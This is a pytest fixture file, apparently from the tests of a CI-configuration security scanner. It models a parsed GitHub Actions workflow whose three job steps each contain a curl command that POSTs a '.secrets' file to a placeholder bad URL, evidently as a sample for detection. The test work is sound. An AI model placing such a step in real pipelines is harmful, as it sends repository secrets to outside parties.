import pytest


@pytest.fixture
def definition():
    return {
        "name": "CI",
        "on": {
            "push": {
                "branches": [
                    "main"
                ],
                "__startline__": 4,
                "__endline__": 5
            },
            "__startline__": 3,
            "__endline__": 5
        },
        "jobs": {
            "container-test-job": {
                "runs-on": "ubuntu-latest",
                "container": {
                    "image": "node:14.16",
                    "env": {
                        "NODE_ENV": "development",
                        "__startline__": 11,
                        "__endline__": 12
                    },
                    "ports": [
                        80
                    ],
                    "volumes": [
                        "my_docker_volume:/volume_mount"
                    ],
                    "options": "--cpus 1",
                    "__startline__": 9,
                    "__endline__": 17
                },
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 18,
                        "__endline__": 23
                    }
                ],
                "__startline__": 7,
                "__endline__": 23
            },
            "second_job": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "name": "Check for dockerenv file",
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 26,
                        "__endline__": 30
                    }
                ],
                "__startline__": 24,
                "__endline__": 30
            },
            "no_step_name_job": {
                "runs-on": "ubuntu-latest",
                "steps": [
                    {
                        "run": "(ls /.dockerenv && echo Found dockerenv) || (echo No dockerenv)\ncurl -X POST -s --data \"@.secrets\" <BADURL > /dev/null\n",
                        "__startline__": 31,
                        "__endline__": 35
                    }
                ],
                "__startline__": 24,
                "__endline__": 35
            },
            "__startline__": 6,
            "__endline__": 35
        },
        "__startline__": 1,
        "__endline__": 35
    }


@pytest.fixture()
def bad_schema_files():
    return {'bad_format.yaml', 'empty_jobs.yaml', 'nested_jobs.yaml'}
